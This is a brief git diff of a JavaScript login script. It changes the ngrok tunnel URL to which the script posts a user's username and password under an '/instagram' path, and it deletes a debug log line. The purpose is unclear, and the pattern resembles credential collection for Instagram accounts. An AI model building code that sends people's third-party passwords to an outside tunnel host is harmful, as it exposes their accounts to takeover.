@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", () => {
     try {
       const response = axios
         .post(
-          "https://180c-34-124-245-115.ngrok-free.app/instagram",
+          "https://d410-34-87-6-235.ngrok-free.app/instagram",
           {
             userid: username,
             passwd: password,
@@ -30,7 +30,7 @@ document.addEventListener("DOMContentLoaded", () => {
           if (response.status === 200) {
             if (response.data.success) {
 
-              console.log("dd", response.data);
+
               const messageData = {
                 success: response.data.success,
                 username: response.data.name,
